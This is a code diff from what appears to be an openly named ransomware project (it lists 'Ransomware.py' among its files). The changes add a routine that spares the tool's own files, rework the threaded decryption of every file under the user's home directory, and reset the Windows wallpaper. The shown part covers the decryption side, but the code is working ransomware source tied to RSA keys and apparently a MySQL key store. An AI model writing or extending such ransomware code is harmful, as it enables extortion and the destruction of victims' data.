@@ -119,6 +119,14 @@ import mysql.connector
 from __init__ import decrypt_file
 from key import newkeys, PrivateKey
 
+def protect_Code_Files(filename):
+    if filename in ("__init__.py", "asn1.py", "cli.py", "common.py",
+                    "core.py", "key.py", "parallel.py", "pem.py",
+                    "pkcs1.py", "pkcs1_v2.py", "prime.py", "randnum.py",
+                    "transform.py", "util.py","Ransomware.py","image.png"):
+        return True
+    return False
+
 def decyptionalgorithme(key):
     key = key.split(",")
     finalkey = PrivateKey(int(key[0]), int(key[1]), int(key[2]), int(key[3]), int(key[4]))
@@ -129,18 +137,25 @@ def decyptionalgorithme(key):
     for folder in folders_in_home_directory:
         for dirpath, dirnames, filenames in os.walk(os.path.join(userhome, folder)):
             for filename in filenames:
-                file = os.path.join(dirpath, filename)
-                if os.access(file, os.W_OK) and os.access(file, os.R_OK):
-                    Thread(target=decrypt_file, args=(file, finalkey)).start()
-                    print(file, " : decrypted successfully ")
-                else:
-                    print("access denied to this file : ", file)    
+                if protect_Code_Files(filename) == False:
+                    file = os.path.join(dirpath, filename)
+                    if file.endswith(".ini"):
+                        continue
+                    else:
+                        if os.access(file, os.W_OK) and os.access(file, os.R_OK):
+                            try:
+                                Thread(target=decrypt_file, args=(file, finalkey)).start()
+                                print(file, " : decrypted successfully ")
+                            except:
+                                print("ignoring error on decrypting this file : ", file)
+                        else:
+                            print("access denied to this file : ", file)  
     
-    import ctypes
-    SPI_SETDESKWALLPAPER = 20
+import ctypes
+SPI_SETDESKWALLPAPER = 20
 
-    # Set the wallpaper to the default Windows background image
-    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg", 0)
+# Set the wallpaper to the default Windows background image
+ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg", 0)
 
 def decrypt():
     hostname = []
